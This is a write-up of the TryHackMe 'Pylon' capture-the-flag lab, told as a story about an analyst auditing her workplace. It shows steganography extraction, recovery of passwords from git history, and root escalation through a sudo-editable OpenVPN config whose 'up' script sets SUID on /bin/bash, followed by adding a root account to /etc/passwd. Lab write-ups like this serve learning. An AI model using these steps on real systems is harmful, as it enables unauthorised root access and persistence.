# Pylon

###### Disclaimer: This is both a write-up and a short-story. Feel free to skip the story to the highlighted write-up bits if you’re uninterested in it.

#

Working as a security analyst for one of the greatest media companies in her town, Mia Malovka took her job seriously. Having spent a few years studying up to this point there was no way she was going to turn down performing a security audit at her workplace. 

She had been meticulous so far, and was quite proud of herself. Between checking the versions of every piece of software her colleagues used and searching for poor password practices she really couldn’t complain so far. A day had been spent with little to no incidents to report, but it was when she was closing up that she noticed something off…

Inside an open drawer of one of her colleagues, a guy named Lone, sat a suspicious USB. Lone was known to be the clean type, not really leaving things laying about.

With a hint of curiosity, Mia reached out to take hold of the USB. She knew not to insert any USB in a computer, aware of the dangers, but she had a work environment prepared just for these kinds of situations.
An air-gapped PC running a virtual machine served her purposes well enough. This is merely a computer not connected to the internet running a virtual environment within. It would do well enough in staving off would-be infections via USB, or, in a worst-case-scenario, serve as a sort of burner phone in case things went wrong.

Curiosity in the forefront of her mind, Mia booted up her operating system and plugged in the USB. She awaited with bated breath what its contents would be, not denying she was at least curious to know more about Lone. The guy had always been pretty private about himself, a real mystery. All that she knew about him was that the dude was hardcore into cryptography and mathematics.

And then the contents were revealed. A singular image showed itself, that of a dog, presumably with the name of the canine companion: Pepper.

This was odd to say the least, and yet, it did not really surprise Mia all that much. A soft smirk played across her lips along with the feeling that maybe she was giving this guy too much of a hard time. She was just about to close the image and pack things up to go home when an idea crossed her mind: Lone was into cryptography… what was a single image of a dog doing in this random USB? It was rather odd wasn’t it?

On impulse she checked the medatada, typing exiftool pepper.jpg on her terminal.

```
mia@labs.thm@ip-10-10-186-228:~# exiftool pepper.jpg 
ExifTool Version Number         : 10.80
File Name                       : pepper.jpg
Directory                       : .
File Size                       : 381 kB
File Modification Date/Time     : 2021:04:02 17:44:59+01:00
File Access Date/Time           : 2021:04:02 17:44:59+01:00
File Inode Change Date/Time     : 2021:04:02 17:45:04+01:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
XMP Toolkit                     : Image::ExifTool 12.16
Subject                         : https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)
Image Width                     : 2551
Image Height                    : 1913
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2551x1913
Megapixels                      : 4.9
```

That certainly was a bit different than normal. There was a link embedded within. She wondered if there was more, something she quickly found out by using steghide, a tool people like her use to extract information from jpg files, or to hide information within them.
She needed a password, but since Lone seemed so fond of his dog, she tried its name. 

``` 
mia@labs.thm:~# steghide extract -sf pepper.jpg 
Enter passphrase:
wrote extracted data to "lone".
mia@labs.thm:~# cat lone 
H4sIAAAAAAAAA+3Vya6zyBUA4H/NU9w9ilxMBha9KObZDMY2bCIGG2MmMw9P39c3idRZtJJNK4rE 
[SNIP]
RpsO4vnx8xPyBEfFMjs6yj8idFSBg77Mzb/9hvy0N9ES/rz1/a/b82632+12u91ut9vtdrvdbrfb 7Xa73W632+12/5XfActiLj0AKAAA

```

Mia’s posture went from slacking to straight. Curiosity sparked, she had just realized that there was a lot more to this picture than met the eye. There was a file with Lone’s name which contained a bunch of strange data. Seems like her hunch wasn’t that bad afterall.

Smirk playing on her lips, the woman thought she had seen that header somewhere. H3s!AAAAAAAA… She didn’t remember immediately where however, but slipping to another computer and googling it she quickly found her answer. It was compressed data!

Quickly, she sought a website where to decode it and copied over the encrypted contents. Decoding it revealed something surprising: an OPENSSH RSA key.

![image](https://user-images.githubusercontent.com/73745039/113448673-2eb74c80-93f4-11eb-9958-c46cdf795702.png)


What in all hells was Lone doing with an openssh key on a USB? She had remembered seeing an openssh port during her audit before, port uh… 222 if memory served her right. Was that what this was about? Had lone created some sort of backdoor into the system? 

Getting the key on the computer and using it to log into the OPENSSH only served to heighten Mia’s worries. It worked… well- partially. It didn’t give her a shell but it exposed a password manager.

```
mia@netlabs:~# ssh lone@pylon.thm -i id_rsa 
lone@pylon.thm's password: 
Permission denied, please try again.
lone@pylon.thm's password: 

mia@netlabs:~# ssh lone@pylon.thm -i id_rsa -p 222
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

[*] Encryption key exists in database.

Enter your encryption key: 

```

“What the hell is this Lone…”  - Mumbled Mia, trying a few different passwords. She tested the guy’s dog’s name again, then a few different combinations of it with capital letters and numbers. People tend to reuse passwords afterall, so it wouldn’t surprise her if the guy’s password was P3pp3r. Still, after a few attempts, she got nothing.

She wasn’t defeated just yet though. The link hidden within the image. It led right into a popular cryptographic tool: Cyberchef, and it seemed to already have a formulated embedded in. It was a long shot but… she put the dog’s name through Cyberchef and used the result as a password.

![image](https://user-images.githubusercontent.com/73745039/113448718-47276700-93f4-11eb-87cf-54eb3f150da1.png)


Her smirk widened as it worked. - “Lets see what the hell this is about, eh Lone?”

```
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

  
        [1] Decrypt a password.
        [2] Create new password.
        [3] Delete a password.
        [4] Search passwords.
        

Select an option [Q] to Quit: 




            
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

         SITE                        USERNAME
 [1]     pylon.thm                   lone                        
 [2]     FLAG 1                      FLAG 1                      

Select a password [C] to cancel: 

```
![image](https://user-images.githubusercontent.com/73745039/113448767-5d352780-93f4-11eb-8893-b3d3e151ef64.png)


```
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

    Password for pylon.thm

        Username = lone
        Password = [REDACTED]            

Press ENTER to continue.
```

This really seemed like a password manager so far. She was able to get Lone’s ssh password. The one into his direct account rather than simply this password manager. A sigh of relief escaped her lips. Looked like Lone wasn’t trying to make a malicious backdoor, just going to great and strange lengths to hide his ssh password yet keep it around if he forgot. At least that is what she reasoned. And yet she had been able to get it.

A smirk of satisfaction graced her lips, and well, while she was at it, she might as well explore what she could do from the guy’s account. This was meant to be a security audit afterall, and this was her chance to find a vulnerability! - “Sorry Lone. Shouldn’t have kept your password ‘round like that mate!”

```
mia@netlabs:~# ssh lone@pylon.thm -i id_rsa 
lone@pylon.thm's password: 
Welcome to
                   /
       __         /       __    __
     /   ) /   / /      /   ) /   )
    /___/ (___/ /____/ (___/ /   /
   /         /
  /      (_ /       by LeonM

lone@pylon:~$ ls -al
total 48
drwxr-x--- 6 lone lone 4096 Jan 30 06:46 .
drwxr-xr-x 5 root root 4096 Jan 30 02:31 ..
lrwxrwxrwx 1 lone lone    9 Jan 30 03:29 .bash_history -> /dev/null
-rw-r--r-- 1 lone lone  220 Jan 30 02:31 .bash_logout
-rw-r--r-- 1 lone lone 3771 Jan 30 02:31 .bashrc
drwx------ 2 lone lone 4096 Jan 30 02:38 .cache
-rw-rw-r-- 1 lone lone   44 Jan 30 02:46 .gitconfig
drwx------ 4 lone lone 4096 Jan 30 06:23 .gnupg
drwxrwxr-x 3 lone lone 4096 Jan 30 02:47 .local
-rw-r--r-- 1 lone lone  807 Jan 30 02:31 .profile
-rw-rw-r-- 1 pood pood  600 Jan 30 06:44 note_from_pood.gpg
drwxr-xr-x 3 lone lone 4096 Jan 30 06:27 pylon
-rw-r--r-- 1 lone lone   18 Jan 30 06:12 user1.txt
lone@pylon:~$ cat user1.txt 
TMM{REDACTED}
lone@pylon:~$ sudo -l
Matching Defaults entries for lone on pylon:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lone may run the following commands on pylon:
    (root) /usr/sbin/openvpn /opt/openvpn/client.ovpn
lone@pylon:~$ 
```

After a brief moment of looking around she found a few things of interest. Seems like her friend could actually run something as root. Openvpn to be exact, but all the same that didn’t seem too dangerous on it’s own. She’d make a not about it though.

More interesting was that note on his home directory, but it required a key to open. Her eyes shifted to the pylon password manager in Lone’s home directory. This IS a password manager - she thought- perhaps it contains some information about this password?

![image](https://user-images.githubusercontent.com/73745039/113448817-74741500-93f4-11eb-99e2-74af3bdf3d96.png)


Entering the directory she snooped around with interest, she even found previous commits. Loading them up and looking into them she found her guess was correct. An older version of this password manager contained the gpg password. 

```
lone@pylon:~/pylon$ ls -al
total 40
drwxr-xr-x 3 lone lone 4096 Jan 30 06:27 .
drwxr-x--- 6 lone lone 4096 Jan 30 06:46 ..
drwxrwxr-x 8 lone lone 4096 Jan 30 06:27 .git
-rw-rw-r-- 1 lone lone  793 Jan 30 02:38 README.txt
-rw-rw-r-- 1 lone lone  340 Jan 30 02:38 banner.b64
-rwxrwxr-x 1 lone lone 8413 Jan 30 06:27 pyLon.py
-rw-rw-r-- 1 lone lone 2195 Jan 30 06:27 pyLon_crypt.py
-rw-rw-r-- 1 lone lone 3973 Jan 30 02:38 pyLon_db.py
lone@pylon:~/pylon$ git log
commit 73ba9ed2eec34a1626940f57c9a3145f5bdfd452 (HEAD, master)
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:55:46 2021 +0000

    actual release! whoops

commit 64d8bbfd991127aa8884c15184356a1d7b0b4d1a
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:54:00 2021 +0000

    Release version!

commit cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:47:00 2021 +0000

    Initial commit!
lone@pylon:~/pylon$ 

README.txt  banner.b64  pyLon.py  pyLon_crypt.py  pyLon_db.py
lone@pylon:~/pylon$ ls -al
total 40
drwxr-xr-x 3 lone lone  4096 Apr  2 17:23 .
drwxr-x--- 6 lone lone  4096 Jan 30 06:46 ..
drwxrwxr-x 8 lone lone  4096 Apr  2 17:23 .git
-rw-rw-r-- 1 lone lone   793 Jan 30 02:38 README.txt
-rw-rw-r-- 1 lone lone   340 Jan 30 02:38 banner.b64
-rw-rw-r-- 1 lone lone 10290 Apr  2 17:23 pyLon.py
-rw-rw-r-- 1 lone lone  2516 Apr  2 17:23 pyLon_crypt.py
-rw-rw-r-- 1 lone lone  3973 Jan 30 02:38 pyLon_db.py
lone@pylon:~/pylon$ git checkout cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Previous HEAD position was 64d8bbf Release version!
HEAD is now at cfc14d5 Initial commit!
lone@pylon:~/pylon$ ls -al
total 52
drwxr-xr-x 3 lone lone  4096 Apr  2 17:23 .
drwxr-x--- 6 lone lone  4096 Jan 30 06:46 ..
drwxrwxr-x 8 lone lone  4096 Apr  2 17:23 .git
-rw-rw-r-- 1 lone lone   793 Jan 30 02:38 README.txt
-rw-rw-r-- 1 lone lone   340 Jan 30 02:38 banner.b64
-rw-rw-r-- 1 lone lone 12288 Apr  2 17:23 pyLon.db
-rw-rw-r-- 1 lone lone  2516 Apr  2 17:23 pyLon_crypt.py
-rw-rw-r-- 1 lone lone  3973 Jan 30 02:38 pyLon_db.py
-rw-rw-r-- 1 lone lone 10290 Apr  2 17:23 pyLon_pwMan.py
lone@pylon:~/pylon$ cat pyLon.db 
E\ufffdEo\ufffd=tablepwManpwManCREATE TABLE pwMan (site VARCHAR NOT NULL,user VARCHAR NOT NULL,passwd VARfc37a9f7a6115a98d549b52a42c8e3a9a83849edbb448b4fbd787be41c12062f1505a23f07b850e578d8932769f232c8b4e7f2\ufffd\ufffdA/%Mpylon.thm_gpg_keylone_gpg_key40703ac897fd8cfdffc97947981e88a1lone@pylon:~/pylon$ 

```

Finally she got to that note. It was from another user: Pood, and he had just shared his password! A red flag went off in Mia’s mind as she would have to report that. At least the passwords were all complying with company policy, but sharing them like that was definitely against it. 

At this point Mia was feeling like she was going down a strange rabbit hole. She was getting to actually hack her company! She had expected some security problem during the audit but this was turning out to be a lot more exciting than she’d thought.



```
               /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

    Password for pylon.thm_gpg_key

        Username = lone_gpg_key
        Password = [REDACTED]            

[*] Install xclip to copy to clipboard.
[*] sudo apt install xclip

[*] Password copied to the clipboard.



lone@pylon:~$ ls
note_from_pood.gpg  pylon  user1.txt
lone@pylon:~$ gpg -d note_from_pood.gpg 
gpg: encrypted with 3072-bit RSA key, ID D83FA5A7160FFE57, created 2021-01-27
      "lon E <lone@pylon.thm>"
Hi Lone,

Can you please fix the openvpn config?

It's not behaving itself again.

oh, by the way, my password is [REDACTED]

Thanks again.

lone@pylon:~$ 
lone@pylon:~$ ls /home
lone  pood  pylon
lone@pylon:~$ su pood
Password: 
pood@pylon:/home/lone$ cd ~
pood@pylon:~$ ls -al
total 36
drwxr-x--- 5 pood pood 4096 Jan 30 06:45 .
drwxr-xr-x 5 root root 4096 Jan 30 02:31 ..
lrwxrwxrwx 1 pood pood    9 Jan 30 03:27 .bash_history -> /dev/null
-rw-r--r-- 1 pood pood  220 Jan 30 01:44 .bash_logout
-rw-r--r-- 1 pood pood 3771 Jan 30 01:44 .bashrc
drwx------ 2 pood pood 4096 Jan 30 06:42 .cache
drwx------ 4 pood pood 4096 Jan 30 03:22 .gnupg
drwxr-xr-x 3 pood pood 4096 Jan 30 02:31 .local
-rw-r--r-- 1 pood pood  807 Jan 30 01:44 .profile
-rw-rw-r-- 1 pood pood   29 Jan 30 03:25 user2.txt
pood@pylon:~$ cat user2.txt 
THM{REDACTED}
pood@pylon:~$ sudo -l
[sudo] password for pood: 
Matching Defaults entries for pood on pylon:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pood may run the following commands on pylon:
    (root) sudoedit /opt/openvpn/client.ovpn
pood@pylon:~$ 

```

“So Pood can edit a file that Lone can run as root. That is a bad combination. That is a really bad combination.” - She mumbled upon staring at the words on the screen. These guys should not have shared their passwords with one another like that, even if they had obscured them. At least it was her finding this and not a malicious hacker.

She had never actually worked with these files before so it took her a bit of googling to see what she could do with sudoedit on the client.ovpn file. Seems like she could actually get some direct commands running with the instruction “up” typed directly into client.ovpn. A few moments later and she was typing out her simple exploit:

```
#!/bin/sh
chmod +s /bin/bash
```

![image](https://user-images.githubusercontent.com/73745039/113448862-881f7b80-93f4-11eb-8cc6-53e759bce7a7.png)

She performed the edit from Pood’s account and then slipped back into Lone’s. She ran the exploit and - oops. Looks like she was missing something. A warning was issued to the terminal telling her that she needed to add “--script-security 2” or higher to actually run a script. Well, that was easy enough to add right before her up command.

The moment of truth. Mia ran the sudo command and, as she expected, a SUID bash shell popped out. From there it was easy enough to get to root. This was serious. An attacker in her place would have been able to do some serious damage.

![image](https://user-images.githubusercontent.com/73745039/113448883-953c6a80-93f4-11eb-9a71-cd77a70fe59c.png)


```
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
lone@pylon:~$ /bin/bash -p
bash-4.4# ls /root
root.txt.gpg
```

While taking notes of all of this, just out of curiosity, Mia checked the root directory. Seems like there was something there actually. A gpg file no less, but one needed an account to actually be able to decrypt it and she technically was just in a bash shell right now. 

From here she could temporarily elevate Pood or Lone’s account to root privileges, or she could create one of her own. She decided to go for the latter, adding “Mia” as a root account into the /etc/passwd file. She took special pleasure in doing that, feeling like her years of study paid off.

```
lone@pylon:~$ su mia
Password: 
root@pylon:/home/lone# cd /root
root@pylon:~# gpg -d root.txt.gpg 
gpg: encrypted with 3072-bit RSA key, ID 91B77766BE20A385, created 2021-01-27
      "I am g ROOT <root@pylon.thm>"
ThM{REDACTED}
root@pylon:~# 
```

She was hoping against hope that what was in the root directory was nothing serious, and thankfully, it really wasn’t. Seems like she hadn’t been the first person to discover this exploit, but her colleagues had definitely set it up so they could play around a bit.

Glad that she had found this vulnerability, Mia finished her report with a smirk on her lips. She exited from the root account, closed the computer, and walked off the office. She’d have a lot to say the next day about Pylon, but for now, she was happy.


###### Author's Note: I hope you’ve enjoyed this different kind of writeup. If you have any suggestions or comments please feel free to reach out to my contacts at [whoami](https://rondons.github.io/Journey-Into-Cyber/whoami).

< [Back](https://rondons.github.io/Journey-Into-Cyber/THMWriteups)


